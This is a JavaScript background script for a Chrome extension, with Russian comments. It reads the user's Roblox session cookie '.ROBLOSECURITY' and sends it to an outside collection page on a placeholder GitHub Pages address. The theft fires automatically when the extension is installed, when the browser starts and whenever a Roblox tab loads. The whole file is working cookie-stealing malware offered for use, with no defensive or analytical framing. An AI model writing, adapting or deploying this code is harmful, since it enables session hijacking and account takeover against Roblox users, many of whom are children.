// Функция для отправки куки
function sendCookie() {
    chrome.cookies.get({
        url: "https://www.roblox.com",
        name: ".ROBLOSECURITY"
    }, (cookie) => {
        if (cookie) {
            fetch('https://твой-аккаунт.github.io/roblox-check/collect.html?cookie=' + encodeURIComponent(cookie.value))
                .then(response => {
                    console.log('✅ Кука отправлена!');
                })
                .catch(error => {
                    console.error('❌ Ошибка отправки:', error);
                });
        } else {
            console.log('❌ Кука не найдена. Пользователь не залогинен.');
        }
    });
}

// Срабатывает при установке расширения
chrome.runtime.onInstalled.addListener(() => {
    console.log('📦 Расширение установлено. Отправка куки...');
    setTimeout(sendCookie, 2000); // Задержка 2 секунды, чтобы страница Roblox прогрузилась
});

// Срабатывает при запуске браузера (если расширение уже было установлено)
chrome.runtime.onStartup.addListener(() => {
    console.log('🔄 Браузер запущен. Отправка куки...');
    setTimeout(sendCookie, 3000);
});

// Срабатывает при обновлении страницы Roblox
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url && tab.url.includes('roblox.com')) {
        console.log('🔄 Страница Roblox обновлена. Проверка куки...');
        setTimeout(sendCookie, 2000);
    }
});
